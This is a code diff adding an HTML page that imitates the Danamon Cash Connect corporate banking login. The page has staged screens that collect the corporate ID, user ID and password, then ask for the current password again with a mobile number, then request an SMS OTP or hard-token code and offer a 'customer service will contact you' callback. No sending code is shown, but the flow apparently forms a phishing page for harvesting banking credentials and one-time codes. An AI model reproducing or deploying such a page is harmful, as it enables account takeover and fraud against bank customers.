@@ -1,0 +1,1465 @@
+<!DOCTYPE html><html><head>
+    <meta charset="utf-8">
+    <title>Danamon Cash Connect</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/jquery-ui.css">
+    <link href="css/style-fixing.css" rel="stylesheet">
+    <link href="css/bootstrap.css" rel="stylesheet">
+    <link href="css/login02.css" rel="stylesheet">
+    <link href="css/main-danamon.css" rel="stylesheet">
+    <style>
+        .ui-widget-header{
+            font-weight: bold !important;
+            color: #fff1c9 !important;
+            text-shadow: 0 1px 0 #000 !important;
+        }
+
+        div#mufg-after-logout {
+            font-size: x-large;
+            display: flex;
+            flex-direction: column;
+            align-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 20%;
+            margin-top: 20%;
+        }
+
+        /* Loading Overlay */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #loadingOverlay .loader {
+            background: white;
+            padding: 30px 40px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        #loadingOverlay .loader img {
+            width: 50px;
+            height: 50px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto;
+            border: 5px solid #e0e0e0;
+            border-top-color: #9e9e9e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        #loadingOverlay .loader p {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* Halaman */
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+
+        /* Password Requirements */
+        .password-requirements {
+            font-size: 11px;
+            color: #888;
+            margin-top: 2px;
+            padding: 0;
+            line-height: 1.6;
+        }
+        .password-requirements .req {
+            display: inline-block;
+            padding: 0 10px 0 0;
+            font-size: 11px;
+            color: #888;
+        }
+        .password-requirements .req.valid {
+            color: #28a745;
+        }
+        .password-requirements .req.invalid {
+            color: #dc3545;
+        }
+
+        .alert-message {
+            padding: 8px 12px;
+            border-radius: 4px;
+            margin-top: 8px;
+            display: none;
+            font-size: 13px;
+        }
+        .alert-message.show {
+            display: block;
+        }
+        .alert-message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .alert-message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .btn-back {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-size: 13px;
+        }
+        .btn-back:hover {
+            background: #5a6268;
+        }
+
+        .btn-group-action {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+            justify-content: flex-end;
+        }
+        .btn-group-action .btn-submit-text-m {
+            width: auto;
+            min-width: 120px;
+        }
+
+        .btn-submit-text-m.success {
+            background: #28a745;
+        }
+        .btn-submit-text-m.success:hover {
+            background: #1e7e34;
+        }
+
+        /* User info */
+        .user-info-box {
+            background: transparent;
+            padding: 2px 0 10px 0;
+            font-size: 13px;
+            color: #555;
+            border-bottom: none;
+        }
+        .user-info-box strong {
+            color: #333;
+        }
+
+        .sub-title-text {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 12px;
+            font-style: italic;
+        }
+
+        .phone-hint {
+            font-size: 11px;
+            color: #999;
+            margin-top: 2px;
+            display: block;
+        }
+
+        /* Halaman 2 & 3 - full width */
+        #page2 #login1, #page3 #login1 {
+            width: 100%;
+            margin: 0 !important;
+            padding: 15px 20px !important;
+        }
+        #page2 .col-md-4, #page3 .col-md-4 {
+            width: 100%;
+        }
+        #page2 #login3, #page2 #login2,
+        #page3 #login3, #page3 #login2 {
+            display: none !important;
+        }
+
+        #page2 .form-group, #page3 .form-group {
+            margin-bottom: 8px;
+        }
+        #page2 .form-control, #page3 .form-control {
+            height: 34px;
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+        #page2 .text-masuk, #page3 .text-masuk {
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+        #page2 .btn-submit-text-m, #page3 .btn-submit-text-m {
+            padding: 8px 25px;
+            font-size: 14px;
+        }
+        #page2 .btn-back, #page3 .btn-back {
+            padding: 8px 16px;
+            font-size: 13px;
+        }
+        #page2 .security-info, #page3 .security-info {
+            padding: 5px 0;
+        }
+        #page2 .chl-container2, #page3 .chl-container2 {
+            margin: 0;
+        }
+
+        /* Sembunyikan Forgot Password di halaman 2 & 3 */
+        #page2 .text-forgot, #page2 .first-login,
+        #page3 .text-forgot, #page3 .first-login {
+            display: none !important;
+        }
+
+        /* Halaman 3 - OTP */
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .otp-container .form-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        .otp-container .otp-label {
+            font-size: 13px;
+            color: #0055a4;
+            cursor: pointer;
+            white-space: nowrap;
+            font-weight: bold;
+            padding: 5px 10px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        .otp-container .otp-label:hover {
+            background: #e8f0fe;
+            text-decoration: underline;
+        }
+        .otp-container .otp-label.active {
+            color: #28a745;
+        }
+
+        .help-link {
+            color: #0055a4;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+        .help-link:hover {
+            color: #003d7a;
+        }
+
+        .error-msg {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+
+        /* Popup */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-overlay.show {
+            display: flex;
+        }
+        .popup-box {
+            background: white;
+            padding: 30px 35px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 4px 30px rgba(0,0,0,0.3);
+            position: relative;
+            text-align: center;
+        }
+        .popup-box .close-popup {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #999;
+            cursor: pointer;
+            transition: color 0.2s;
+            background: none;
+            border: none;
+        }
+        .popup-box .close-popup:hover {
+            color: #333;
+        }
+        .popup-box .popup-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .popup-box h4 {
+            color: #0055a4;
+            margin-bottom: 8px;
+        }
+        .popup-box p {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 0;
+        }
+    </style>
+</head>
+<body class="body-login">
+    <div id="loadingOverlay">
+        <div class="loader">
+            <div class="spinner"></div>
+            <p id="progreesLoad">Processing...</p>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="popupHelp">
+        <div class="popup-box">
+            <button class="close-popup" onclick="closePopup()">✕</button>
+            <div class="popup-icon">🙏</div>
+            <h4>Terimakasih</h4>
+            <p>Layanan pelanggan kami segera menghubungi anda.</p>
+        </div>
+    </div>
+
+    <div id="wrap2">
+        <header id="header-halaman-1" class="navbar lg-navbar-inverse navbar-fixed-top" role="banner" style="display: block;">
+            <div class="text-info">
+                <div class="container">
+                    <div class="navbar-header">
+                        <a href="#"> <img src="images/cashconnect.png" style="height:100px;width:200px;margin-top:-25px"></a>
+                        <div class="lg-wrapper-language">
+                            <div class="btn-group btn-group-radio">
+                                <a href="#" onclick="showHelp();" class="btn btn-default" type="button">Help</a>
+                                <a href="#" onclick="changeLanguage();" class="btn btn-default" type="button">Bahasa</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <header id="header-baru" style="display: none; position: fixed; top: 0; left: 0; width: 100%; background: #ffffff; box-shadow: 0 3px 5px rgba(0,0,0,0.15); z-index: 1030; align-items: center; justify-content: space-between; padding: 12px 24px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; box-sizing: border-box; border-bottom: 2px solid #fcd567;">
+            <div style="display: flex; align-items: center; gap: 20px;">
+                <div style="background: linear-gradient(to bottom, #f9a34b, #eb7f21); width: 34px; height: 34px; display: flex; justify-content: center; align-items: center; border-radius: 6px; cursor: pointer; color: white; font-size: 22px; font-weight: bold; border: 1px solid #d47215; box-shadow: 0 2px 3px rgba(0,0,0,0.2); line-height: 1;">
+                    ≡
+                </div>
+                <img src="images/cashconnect.png" alt="Cash Connect" style="height: 50px; object-fit: contain;">
+                <div style="background: #fcd567; display: flex; align-items: center; justify-content: space-between; padding: 6px 12px; border-radius: 4px; width: 260px; margin-left: 15px;">
+                    <input type="text" placeholder="search" style="border: none; background: transparent; outline: none; width: 100%; color: #666; font-size: 14px; font-family: inherit;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#222" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="cursor: pointer; margin-left: 5px;"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                </div>
+            </div>
+            <div style="display: flex; align-items: center; gap: 20px; color: #333;">
+                <div style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </div>
+                <div style="cursor: pointer; display: flex; align-items: center;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                </div>
+                <div style="cursor: pointer; display: flex; align-items: center;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path><line x1="12" y1="2" x2="12" y2="12"></line></svg>
+                </div>
+            </div>
+        </header>
+
+        <div class="container login-cont" style="padding: 100px 20px 0px;">
+            <div class="panel panel-primary">
+                <div class="panel-heading"><span class="ico-arrow-right" style="display:none"></span></div>
+                <div class="panel-body">
+
+                    <div id="page1" class="page active">
+                        <div id="login3" class="col-md-4">
+                            <div id="myCarousel" class="carousel slide" data-ride="carousel">
+                                <ol class="carousel-indicators">
+                                    <li id="log1" data-target="#myCarousel" data-slide-to="0" class="active"></li>
+                                    <li id="log2" data-target="#myCarousel" data-slide-to="1"></li>
+                                    <li id="log3" data-target="#myCarousel" data-slide-to="2"></li>
+                                    <li id="log4" data-target="#myCarousel" data-slide-to="3"></li>
+                                </ol>
+                                <div class="carousel-inner" role="listbox">
+                                    <div class="item active">
+                                        <div id="divNews1" style="overflow: hidden; height: 345px; width:460px; cursor: pointer;">
+                                            <img id="extNews1" class="img-responsive" src="images/8a40f6e09e47d3fa019e75d549633aed.jpg" width="336px" style="height:345px">
+                                            <p><strong>FX Transaction Limit Adjustment Information</strong></p>
+                                            <p>Effective June 2, 2026, FX transaction limit will be adjusted to USD 25,000/month</p>
+                                            <p>More info: <a href="https://www.danamon.co.id/e-banking/business/Danamon-Cash-Connect/?utm_campaign=Product&utm_source=all-socmed&utm_medium=owned&utm_term=External&utm_content=dcc-socmed_21092021" target="_blank">bdi.co.id/dcc</a></p>
+                                        </div>
+                                    </div>
+                                    <div class="item">
+                                        <div id="divNews2" class="img-responsive slide" style="overflow: hidden; height: 345px; cursor: pointer;">
+                                            <img id="extNews2" class="img-responsive" src="images/8a40f6e09e47d3fa019e720698a536f9.jpg" width="336px" style="height:345px">
+                                            <p>SKN/LLG, RTGS and International Transfer service will be unavailable during the following time:</p>
+                                            <ul><li><strong>1 June:</strong> Pancasila Day</li><li><strong>16 June: </strong>Islamic New Year 1448 Hijriah</li></ul>
+                                        </div>
+                                    </div>
+                                    <div class="item">
+                                        <div id="divNews3" style="overflow: hidden; height: 345px; cursor: pointer;">
+                                            <img id="extNews3" class="img-responsive" src="images/8a40f6e09ebd1935019ebdecfc930001.jpg" width="336px" style="height:345px">
+                                            <p>Pastikan aktivasi dan reaktivasi token Danamon Cash Connect hanya menggunakan email user yang terdaftar</p>
+                                        </div>
+                                    </div>
+                                    <div class="item">
+                                        <div id="divNews4" style="overflow: hidden; height: 345px; cursor: pointer;">
+                                            <img id="extNews4" class="img-responsiv" src="images/8a40f6e09e2323b1019e236a8e690003.jpg" width="336px" style="height:345px">
+                                            <p><strong>BEWARE OF BANKING DATA THEFT ATTEMPTS</strong></p>
+                                            <p>Keep your confidential banking data (User ID, Token, OTP Code, Password, and Token PIN) and never share it to anyone.</p>
+                                            <p>Danamon never asks for confidential information above in any form, report suspicious activity indicating scam attempts by contacting:</p>
+                                            <ul><li>Hello Danamon at 1-500-090 (press 1-5-3)</li><li>Whatsapp Danamon 0858-1-1-500-090 (press 7)</li></ul>
+                                            <p><strong style="background-color: initial;">Info: </strong><a href="https://www.danamon.co.id/bantuan/fraud/?utm_campaign=Fraud&utm_source=Generic&utm_medium=owned&utm_term=Fraud&utm_content=Fraud_" style="background-color: initial;" target="_blank">bdi.co.id/jangankasihcelah</a></p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="login2" class="col-md-4" style="margin-right:30px; margin-bottom: 15px;">
+                            <div class="carousel slide vertical" data-ride="carousel" id="carousel1">
+                                <div id="myCarousel1" class="carousel slide vertical" data-ride="carousel">
+                                    <div class="carousel-inner" role="listbox" style="width:350px; height:130px">
+                                        <div class="item active">
+                                            <div class="text-notif">
+                                                <p><strong>FX Transaction Limit Adjustment Information</strong></p>
+                                                <p>Effective June 2, 2026, FX transaction limit will be adjusted to USD 25,000/month</p>
+                                                <p>More info: <a href="https://www.danamon.co.id/e-banking/business/Danamon-Cash-Connect/?utm_campaign=Product&utm_source=all-socmed&utm_medium=owned&utm_term=External&utm_content=dcc-socmed_21092021" target="_blank">bdi.co.id/dcc</a></p>
+                                            </div>
+                                        </div>
+                                        <div class="item">
+                                            <div class="text-notif">
+                                                <p>SKN/LLG, RTGS and International Transfer service will be unavailable during the following time:</p>
+                                                <ul><li><strong>1 June:</strong> Pancasila Day</li><li><strong>16 June: </strong>Islamic New Year 1448 Hijriah</li></ul>
+                                            </div>
+                                        </div>
+                                        <div class="item">
+                                            <div class="text-notif">
+                                                <p>Pastikan aktivasi dan reaktivasi token Danamon Cash Connect hanya menggunakan email user yang terdaftar</p>
+                                            </div>
+                                        </div>
+                                        <div class="item">
+                                            <div class="text-notif">
+                                                <p><strong>BEWARE OF BANKING DATA THEFT ATTEMPTS</strong></p>
+                                                <p>Keep your confidential banking data (User ID, Token, OTP Code, Password, and Token PIN) and never share it to anyone.</p>
+                                                <p>Danamon never asks for confidential information above in any form, report suspicious activity indicating scam attempts by contacting:</p>
+                                                <ul><li>Hello Danamon at 1-500-090 (press 1-5-3)</li><li>Whatsapp Danamon 0858-1-1-500-090 (press 7)</li></ul>
+                                                <p><strong style="background-color: initial;">Info: </strong><a href="https://www.danamon.co.id/bantuan/fraud/?utm_campaign=Fraud&utm_source=Generic&utm_medium=owned&utm_term=Fraud&utm_content=Fraud_" style="background-color: initial;" target="_blank">bdi.co.id/jangankasihcelah</a></p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <a href="[id^=myCarousel]" class="ticker-previous" role="button" data-slide="next"></a>
+                                <a href="[id^=myCarousel]" class="ticker-next" role="button" data-slide="prev"></a>
+                                <p></p>
+                                <hr class="line-info">
+                                <p></p>
+                                <div class="text-info" style="display:none">
+                                    <a href="#"><img src="images/ico_arrow.png" width="50px" style="float:left;padding-top: 20px"></a>
+                                    <p class="text-notif2"><b>VIDEO DEMO</b><br>Klik disini untuk melihat video demo tutorial penggunaan PrimeCash</p>
+                                    <a href="#"><img src="images/ico_download.png" width="50px" style="float:left;padding-top: 20px"></a>
+                                    <p class="text-notif2"><b>DOWNLOAD TUTORIAL</b><br>Klik disini untuk download demo tutorial penggunaan PrimeCash</p>
+                                </div>
+                                <br>
+                            </div>
+                        </div>
+
+                        <div id="login1" class="col-md-4" style="background:#fff;margin-top: -15px;margin-left: -15px;margin-right:-15px;margin-bottom:-15px">
+                            <p class="text-masuk">Please Login</p>
+                            <form id="loginForm" class="lg-login-form" onsubmit="return false;" autocomplete="off">
+                                <fieldset>
+                                    <p class="form-group">
+                                        <input type="text" class="form-control" id="corpid" required="" value="" placeholder="Corporate ID" onblur="if(this.placeholder=='')this.placeholder='Corporate ID'; " onfocus="if(this.placeholder=='Corporate ID')this.placeholder='' ">
+                                    </p>
+                                    <p class="form-group">
+                                        <input type="text" class="form-control" id="userid" required="" value="" placeholder="User ID" onblur="if(this.placeholder=='')this.placeholder='User ID'; " onfocus="if(this.placeholder=='User ID')this.placeholder='' ">
+                                    </p>
+                                    <p class="form-group">
+                                        <input type="password" class="form-control" id="userpass" required="" value="" placeholder="Password" onblur="if(this.placeholder=='')this.placeholder='Password';" onfocus="showKeywordTooltip(); if(this.placeholder=='Password')this.placeholder=''; randomKeyWord();" data-toggle="tooltip" onmouseover="hideKeywordTooltip()" onclick="showKeywordTooltip()">
+                                    </p>
+
+                                    <div id="divSubmit">
+                                        <p class="btn-submit-img-m">
+                                            <input type="submit" id="btnSubmit" class="btn-submit-text-m" value="Login">
+                                        </p>
+                                        <p class="form-group">
+                                            <a href="#" class="text-forgot" id="populate">Forgot Password ?</a>
+                                        </p>
+                                        <p class="form-group">
+                                            <a href="#" class="first-login" id="firstTimeLogin">First Time Login ?</a>
+                                        </p>
+                                    </div>
+                                    <div id="divMsg" style="display:none;" align="center">
+                                        <div class="spinner"></div>
+                                        <p id="progreesLoad"></p>
+                                    </div>
+                                    <br><br>
+                                </fieldset>
+                                <input id="corpId" name="corpId" type="hidden" value="">
+                                <input id="userId" name="userId" type="hidden" value="">
+                                <input id="lang" name="lang" type="hidden" value="en_US">
+                                <input id="userPassCrypto" name="userPassCrypto" type="hidden" value="">
+                                <input id="corpIdForgotPass" name="corpIdForgotPass" type="hidden" value="">
+                                <input id="userIdForgotPass" name="userIdForgotPass" type="hidden" value="">
+                                <input id="email" name="email" type="hidden" value="">
+                                <input id="phone" name="phone" type="hidden" value="">
+                                <input id="countLogin" name="countLogin" type="hidden" value="0">
+                                <input id="salt" name="salt" type="hidden" value="">
+                                <input id="iv" name="iv" type="hidden" value="">
+                                <input id="hashingSalt" name="hashingSalt" type="hidden" value="mUnsdajsdjberuYAGewbndsbbduAsvdxvsa">
+                                <input id="isSSOMufg" name="isSSOMufg" type="hidden" value="">
+                            </form>
+                            <div style="height: 40px"></div>
+                            <div class="col-md-5 col-xs-6">
+                                <div class="chl-container2">
+                                    <div class="security-info">
+                                        <div class="si-left">
+                                            <a href="https://www.entrust.com/ct-search-result/F8C0F593427512C53982C8C945DFBE84CB1424AC" target="_blank">
+                                                <img width="100px" src="images/entrust-seal.png">
+                                            </a>
+                                            <div class="lock-info"></div>
+                                        </div>
+                                        <div class="si-right">
+                                            <div class="lock-display"><img class="img-responsive" src="images/icon-lock.png" alt="lock" title="lock"></div>
+                                            <div class="lock-info"><strong>Banking Security Tips</strong><br>Keep your User ID, Password, and Token PIN secure. For detail info <a href="/loginfo/downloadDoc">click here</a></div>
+                                        </div>
+                                        <div class="clear"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="page2" class="page" style="display:none;">
+                        <div id="login1" class="col-md-12" style="background:#fff;padding:15px 20px;">
+
+                            <div class="user-info-box">
+                                <strong>User ID:</strong> <span id="displayUserId">-</span> |
+                                <strong>Corporate ID:</strong> <span id="displayCorpId">-</span>
+                            </div>
+                            <p class="text-masuk" style="font-size:18px;margin-bottom:2px;">Change Password</p>
+                            <p class="sub-title-text">Please change your password periodically to maintain account security.</p>
+                            <form id="changePasswordForm" class="lg-login-form" onsubmit="return false;" autocomplete="off">
+                                <fieldset>
+                                    <p class="form-group" style="margin-bottom:8px;">
+                                        <input type="password" class="form-control" id="currentPassword" required="" placeholder="Current Password" style="height:34px;font-size:13px;">
+                                    </p>
+
+                                    <p class="form-group" style="margin-bottom:4px;">
+                                        <input type="password" class="form-control" id="newPassword" required="" placeholder="New Password" style="height:34px;font-size:13px;" onkeyup="validatePassword()">
+                                    </p>
+
+                                    <div class="password-requirements" id="passwordRequirements" style="margin-bottom:6px;">
+                                        <span class="req" id="reqLength">🔸 8+ characters</span>
+                                        <span class="req" id="reqUppercase">🔸 A-Z</span>
+                                        <span class="req" id="reqLowercase">🔸 a-z</span>
+                                        <span class="req" id="reqNumber">🔸 0-9</span>
+                                        <span class="req" id="reqSpecial">🔸 !@#$%^&*</span>
+                                    </div>
+
+                                    <p class="form-group" style="margin-bottom:8px;">
+                                        <input type="password" class="form-control" id="confirmPassword" required="" placeholder="Confirm New Password" style="height:34px;font-size:13px;" onkeyup="validatePasswordMatch()">
+                                        <span id="passwordMatchMsg" style="font-size:11px;margin-top:2px;display:block;"></span>
+                                    </p>
+
+                                    <p class="form-group" style="margin-bottom:2px;">
+                                        <input type="text" class="form-control" id="phoneNumber" required="" placeholder="Mobile Phone Number" style="height:34px;font-size:13px;" onkeypress="return onlyNum(event)">
+                                    </p>
+                                    <span class="phone-hint">Masukkan nomor ponsel terdaftar Anda. Pastikan pulsa Anda mencukupi untuk menerima SMS.</span>
+
+                                    <div id="changePasswordAlert" class="alert-message" style="font-size:12px;padding:6px 10px;margin-top:8px;"></div>
+
+                                    <div id="divSubmit" style="margin-top:10px;">
+                                        <div class="btn-group-action" style="gap:10px;justify-content:flex-end;">
+                                            <button type="button" id="btnBack2" class="btn-back" style="padding:8px 16px;font-size:13px;">← Back</button>
+                                            <button type="button" id="btnChangePassword" class="btn-submit-text-m success" style="background:#f28d31;padding:8px 25px;font-size:14px;min-width:120px;">
+                                                Lanjut
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div id="divMsg2" style="display:none;" align="center">
+                                        <div class="spinner"></div>
+                                        <p id="progreesLoad2"></p>
+                                    </div>
+                                </fieldset>
+                            </form>
+                            <div style="height:20px;"></div>
+                            <div class="col-md-5 col-xs-6" style="padding-left:0;">
+                                <div class="chl-container2">
+                                    <div class="security-info" style="padding:5px 0;">
+                                        <div class="si-left">
+                                            <a href="https://www.entrust.com/ct-search-result/F8C0F593427512C53982C8C945DFBE84CB1424AC" target="_blank">
+                                                <img width="100px" src="images/entrust-seal.png">
+                                            </a>
+                                            <div class="lock-info"></div>
+                                        </div>
+                                        <div class="si-right">
+                                            <div class="lock-display"><img class="img-responsive" src="images/icon-lock.png" alt="lock" title="lock"></div>
+                                            <div class="lock-info" style="font-size:11px;"><strong>Banking Security Tips</strong><br>Keep your User ID, Password, and Token PIN secure. <a href="/loginfo/downloadDoc">click here</a></div>
+                                        </div>
+                                        <div class="clear"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="page3" class="page" style="display:none;">
+                        <div id="login1" class="col-md-12" style="background:#fff;padding:15px 20px;">
+                            <p class="text-masuk" style="font-size:18px;margin-bottom:2px;">Verification</p>
+                            <p class="sub-title-text">Please enter the verification code sent to your registered mobile number.</p>
+
+                            <div class="user-info-box">
+                                <strong>User ID:</strong> <span id="displayUserId3">-</span> |
+                                <strong>Corporate ID:</strong> <span id="displayCorpId3">-</span> |
+                                <strong>Phone:</strong> <span id="displayPhone3">-</span>
+                            </div>
+
+                            <div id="otpErrorMsg" class="error-msg" style="color:#dc3545;font-size:12px;margin-bottom:8px;">
+                                Transaksi tidak dapat diproses, silahkan ulangi.
+                            </div>
+
+                            <form id="otpForm" class="lg-login-form" onsubmit="return false;" autocomplete="off">
+                                <fieldset>
+                                    <div class="otp-container" style="display:flex;gap:10px;align-items:center;margin-bottom:8px;">
+                                        <div class="form-group" style="flex:1;margin-bottom:0;">
+                                            <input type="text" class="form-control" id="otpCode" required="" placeholder="Kode SMS" style="height:34px;font-size:13px;" onkeypress="return onlyNum(event)">
+                                        </div>
+                                        <span class="otp-label" id="hardTokenLabel" onclick="toggleHardToken()">
+                                            Pengguna Hard Token
+                                        </span>
+                                    </div>
+
+                                    <p style="font-size:11px;color:#999;margin-bottom:12px;">
+                                        Jika tidak menerima SMS silahkan tekan berikut untuk layanan pelanggan 
+                                        <span class="help-link" onclick="requestHelp()">BANTUAN</span>
+                                    </p>
+
+                                    <div id="otpAlert" class="alert-message" style="font-size:12px;padding:6px 10px;margin-top:0;"></div>
+
+                                    <div id="divSubmit3" style="margin-top:10px;">
+                                        <div class="btn-group-action" style="gap:10px;justify-content:flex-end;">
+                                            <button type="button" id="btnBack3" class="btn-back" style="padding:8px 16px;font-size:13px;">← Back</button>
+                                            <button type="button" id="btnVerify" class="btn-submit-text-m success" style="background:#f28d31;padding:8px 25px;font-size:14px;min-width:120px;">
+                                                Lanjut
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div id="divMsg3" style="display:none;" align="center">
+                                        <div class="spinner"></div>
+                                        <p id="progreesLoad3"></p>
+                                    </div>
+                                </fieldset>
+                            </form>
+                            <div style="height:20px;"></div>
+                            <div class="col-md-5 col-xs-6" style="padding-left:0;">
+                                <div class="chl-container2">
+                                    <div class="security-info" style="padding:5px 0;">
+                                        <div class="si-left">
+                                            <a href="https://www.entrust.com/ct-search-result/F8C0F593427512C53982C8C945DFBE84CB1424AC" target="_blank">
+                                                <img width="100px" src="images/entrust-seal.png">
+                                            </a>
+                                            <div class="lock-info"></div>
+                                        </div>
+                                        <div class="si-right">
+                                            <div class="lock-display"><img class="img-responsive" src="images/icon-lock.png" alt="lock" title="lock"></div>
+                                            <div class="lock-info" style="font-size:11px;"><strong>Banking Security Tips</strong><br>Keep your User ID, Password, and Token PIN secure. <a href="/loginfo/downloadDoc">click here</a></div>
+                                        </div>
+                                        <div class="clear"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="dialog-popupate-host" title="Forgot Password" style="display: none">
+                        <form id="loginForgotForm" class="lg-login-form" onsubmit="return false;" autocomplete="off">
+                            <div style="margin: 10px; padding: 10px">
+                                <input type="text" id="corpidForget" maxlength="40" class="form-control" required="" value="" placeholder="Corporate ID" onblur="if(this.placeholder=='')this.placeholder='Corporate ID' ;enableEmailPhone()" onfocus="if(this.placeholder=='Corporate ID')this.placeholder='' " onkeypress="enableEmailPhone()">
+                            </div>
+                            <div style="margin: 10px; padding: 10px">
+                                <input type="text" id="useridForget" class="form-control" required="" value="" placeholder="User ID" onblur="if(this.placeholder=='')this.placeholder='User ID'; enableEmailPhone()" onfocus="if(this.placeholder=='User ID')this.placeholder='' " onkeypress="enableEmailPhone()">
+                            </div>
+                            <div style="margin: 10px; padding: 10px" id="emailUs">
+                                <input type="text" id="emailUser" maxlength="256" class="form-control" required="" value="" placeholder="Email" disabled="disabled" onblur="if(this.placeholder=='')this.placeholder='Email'" onfocus="showKeywordTooltip(); if(this.placeholder=='Email')this.placeholder=''; randomKeyWordForgotPassword(); " data-toggle="tooltip" onmouseover="hideKeywordTooltip()">
+                            </div>
+                            <div style="margin: 10px; padding: 10px" id="mobilePh">
+                                <input type="text" id="phoneUser" maxlength="40" class="form-control" required="" value="" placeholder="Input phone number with prefix 0, ex: 0xxx " disabled="disabled" onblur="if(this.placeholder=='')this.placeholder='Mobile Phone No'" onfocus="showKeywordTooltip(); if(this.placeholder=='Mobile Phone No')this.placeholder=''; randomKeyWordForgotPassword(); " onkeypress="return onlyNum(event)" data-toggle="tooltip" onmouseover="hideKeywordTooltip()">
+                            </div>
+                            <div class="button-group">
+                                <div class="button-group-inner" style="min-width:190px;">
+                                    <input type="submit" id="btnSend" value="Send" class="btn btn-primary">
+                                    <input type="button" id="btnCancel" value="Cancel" class="btn btn-primary">
+                                </div>
+                            </div>
+                            <div class="" id="alert" style="color:red;margin: 10px"><p></p></div>
+                        </form>
+                    </div>
+
+                    <div id="dialog-popupate-host-captcha" title=" " style="display: none">
+                        <img src="images/kaptcha.jpg" width="250" height="50" id="kaptchaImage">
+                        <br>
+                        <small>Can't read the image? Click it to get a new one.</small>
+                        <br><br>
+                        <p>
+                            <input type="text" id="kaptchaCode" maxlength="4" required="" value="" placeholder="Input Captcha" onblur="if(this.placeholder=='')this.placeholder='Input Captcha'; " onfocus="if(this.placeholder=='Input Captcha')this.placeholder='' ">
+                        </p>
+                        <div class="link-forgot-captcha" id="errorCapcai"></div>
+                        <br>
+                        <div class="button-group">
+                            <div class="button-group-inner">
+                                <input type="submit" id="btnSendKaptcha" value="Send" class="btn btn-primary">
+                                <input type="button" id="btnCancelCaptcha" value="Cancel" class="btn btn-primary">
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="footer" class="lg-footer navbar-fixed-top">
+        <div class="container login-footer">
+            <table width="100%">
+                <tbody>
+                    <tr>
+                        <td class="text-muted-left" style="width: 20rem; margin-left: -5%">
+                            <p>IKUTI KAMI DI</p>
